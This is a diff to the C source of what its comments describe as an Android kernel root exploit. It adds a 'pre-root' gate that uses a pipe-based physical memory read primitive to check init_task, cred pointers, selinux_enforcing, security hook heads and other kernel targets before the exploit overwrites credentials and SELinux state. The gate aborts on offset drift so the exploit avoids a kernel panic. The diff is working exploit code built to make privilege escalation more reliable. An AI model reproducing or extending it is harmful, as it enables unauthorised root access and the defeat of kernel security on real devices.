@@ -580,3 +580,158 @@ int robustness_check_fops(int fd) {
   pr_success("robustness: fops-gate all checks passed\n");
   return 1;
 }
+
+/* ---- Root 写入前最终安全闸门 (pipe physrw 已就绪) ---- */
+/*
+ * 目的: 偏移漂移时让 exploit 默默回退, 而不是写错地址触发内核 panic
+ * 校验所有 install_android_root 将要写入的内核目标:
+ *   1. init_task.tasks.{next,prev} 是 direct ptr (链表遍历起点)
+ *   2. init_task.{cred,real_cred} 是 kernel ptr (cred 改写前提)
+ *   3. selinux_enforcing 取值 0 或 1 (否则 SELINUX_ENFORCING_OFF 漂移)
+ *   4. security_hook_heads + 0x40 (capable_head) 首成员是 kernel ptr
+ *   5. kmalloc_caches 首成员是 kernel ptr (pipe physrw 依赖)
+ *   6. root_task_group 首成员是 kernel ptr (fake_task.task_group 写入)
+ *   7. anon_pipe_buf_ops 首成员是 kernel ptr (pipe 原语)
+ *   8. selinux_blob_sizes (4.19 用 empty_zero_page) 读得回合理值
+ * 任一失败 -> drift_record + return 0, 调用方应放弃 root 改写
+ */
+int robustness_pre_root_check(int fd) {
+  int fails = 0;
+  uint64_t v64;
+  uint32_t v32;
+
+  pr_info("robustness: pre-root-gate start (target sanity before writes)\n");
+
+  /* 1. init_task.tasks.next 必须是 direct ptr (链表遍历起点) */
+  v64 = pipe_read64(fd, data_addr(INIT_TASK_TASKS));
+  if (is_direct_ptr(v64)) {
+    pr_success("robustness pre-root OK init_task.tasks.next=%016llx\n",
+               (unsigned long long)v64);
+  } else {
+    pr_warning("robustness pre-root FAIL item=INIT_TASK_TASKS.next "
+               "got=%016llx not direct ptr\n", (unsigned long long)v64);
+    drift_record("INIT_TASK_TASKS.next");
+    fails++;
+  }
+
+  /* 2. init_task.tasks.prev 必须是 direct ptr (root.c 用 prev 推 current_task) */
+  v64 = pipe_read64(fd, data_addr(INIT_TASK_TASKS) + 8);
+  if (is_direct_ptr(v64)) {
+    pr_success("robustness pre-root OK init_task.tasks.prev=%016llx\n",
+               (unsigned long long)v64);
+  } else {
+    pr_warning("robustness pre-root FAIL item=INIT_TASK_TASKS.prev "
+               "got=%016llx not direct ptr\n", (unsigned long long)v64);
+    drift_record("INIT_TASK_TASKS.prev");
+    fails++;
+  }
+
+  /* 3. init_task.cred 必须是 kernel ptr (cred 改写前提) */
+  v64 = pipe_read64(fd, data_addr(INIT_TASK) + TASK_CRED_OFF);
+  if (is_kernel_ptr(v64)) {
+    pr_success("robustness pre-root OK init_task.cred=%016llx\n",
+               (unsigned long long)v64);
+  } else {
+    pr_warning("robustness pre-root FAIL item=INIT_TASK.cred "
+               "got=%016llx not kernel ptr\n", (unsigned long long)v64);
+    drift_record("INIT_TASK.cred");
+    fails++;
+  }
+
+  /* 4. init_task.real_cred 必须是 kernel ptr */
+  v64 = pipe_read64(fd, data_addr(INIT_TASK) + TASK_REAL_CRED_OFF);
+  if (is_kernel_ptr(v64)) {
+    pr_success("robustness pre-root OK init_task.real_cred=%016llx\n",
+               (unsigned long long)v64);
+  } else {
+    pr_warning("robustness pre-root FAIL item=INIT_TASK.real_cred "
+               "got=%016llx not kernel ptr\n", (unsigned long long)v64);
+    drift_record("INIT_TASK.real_cred");
+    fails++;
+  }
+
+  /* 5. selinux_enforcing 取值只能是 0 或 1 */
+  v32 = pipe_read32(fd, data_addr(SELINUX_ENFORCING));
+  if (v32 <= 1) {
+    pr_success("robustness pre-root OK selinux_enforcing=%u\n", v32);
+  } else {
+    pr_warning("robustness pre-root FAIL item=SELINUX_ENFORCING_OFF "
+               "got=%08x (expect 0/1)\n", v32);
+    drift_record("SELINUX_ENFORCING_OFF");
+    fails++;
+  }
+
+  /* 6. selinux_blob_sizes (4.19 用 empty_zero_page 替代) 必须可读
+   *    empty_zero_page 内容是 0, 不验证具体值, 只验证读不返回异常
+   *    pipe_read32 失败时返回 0, 这里读两次取异或, 若相同则视为可读
+   */
+  v32 = pipe_read32(fd, data_addr(SELINUX_BLOB_SIZES));
+  uint32_t v32b = pipe_read32(fd, data_addr(SELINUX_BLOB_SIZES) + 4);
+  if (v32 == 0 && v32b == 0) {
+    pr_success("robustness pre-root OK selinux_blob_sizes region readable\n");
+  } else {
+    /* 4.19 empty_zero_page 应全为 0; 非零说明偏移漂移到其他位置 */
+    pr_warning("robustness pre-root FAIL item=SELINUX_BLOB_SIZES_OFF "
+               "got=%08x %08x (expect zeros for empty_zero_page)\n",
+               v32, v32b);
+    drift_record("SELINUX_BLOB_SIZES_OFF");
+    fails++;
+  }
+
+  /* 7. security_hook_heads.capable 首成员必须是 kernel ptr */
+  v64 = pipe_read64(fd, data_addr(SECURITY_CAPABLE_HEAD));
+  if (is_kernel_ptr(v64)) {
+    pr_success("robustness pre-root OK security_hook_heads.capable=%016llx\n",
+               (unsigned long long)v64);
+  } else {
+    pr_warning("robustness pre-root FAIL item=SECURITY_HOOK_HEADS.capable "
+               "got=%016llx not kernel ptr\n", (unsigned long long)v64);
+    drift_record("SECURITY_HOOK_HEADS.capable");
+    fails++;
+  }
+
+  /* 8. kmalloc_caches 首成员必须是 kernel ptr (pipe physrw 依赖) */
+  v64 = pipe_read64(fd, data_addr(KMALLOC_CACHES));
+  if (is_kernel_ptr(v64)) {
+    pr_success("robustness pre-root OK kmalloc_caches[0]=%016llx\n",
+               (unsigned long long)v64);
+  } else {
+    pr_warning("robustness pre-root FAIL item=KMALLOC_CACHES_OFF "
+               "got=%016llx not kernel ptr\n", (unsigned long long)v64);
+    drift_record("KMALLOC_CACHES_OFF");
+    fails++;
+  }
+
+  /* 9. root_task_group 首成员必须是 kernel ptr (fake_task.task_group 写入) */
+  v64 = pipe_read64(fd, data_addr(ROOT_TASK_GROUP));
+  if (is_kernel_ptr(v64)) {
+    pr_success("robustness pre-root OK root_task_group[0]=%016llx\n",
+               (unsigned long long)v64);
+  } else {
+    pr_warning("robustness pre-root FAIL item=ROOT_TASK_GROUP_OFF "
+               "got=%016llx not kernel ptr\n", (unsigned long long)v64);
+    drift_record("ROOT_TASK_GROUP_OFF");
+    fails++;
+  }
+
+  /* 10. anon_pipe_buf_ops 首成员必须是 kernel ptr (pipe 原语) */
+  v64 = pipe_read64(fd, data_addr(ANON_PIPE_BUF_OPS));
+  if (is_kernel_ptr(v64)) {
+    pr_success("robustness pre-root OK anon_pipe_buf_ops[0]=%016llx\n",
+               (unsigned long long)v64);
+  } else {
+    pr_warning("robustness pre-root FAIL item=ANON_PIPE_BUF_OPS_OFF "
+               "got=%016llx not kernel ptr\n", (unsigned long long)v64);
+    drift_record("ANON_PIPE_BUF_OPS_OFF");
+    fails++;
+  }
+
+  if (fails) {
+    pr_warning("robustness: pre-root-gate %d checks FAILED, first=%s — "
+               "aborting root writes to avoid kernel panic\n",
+               fails, g_offset_drift_item);
+    return 0;
+  }
+  pr_success("robustness: pre-root-gate all checks passed — safe to write\n");
+  return 1;
+}
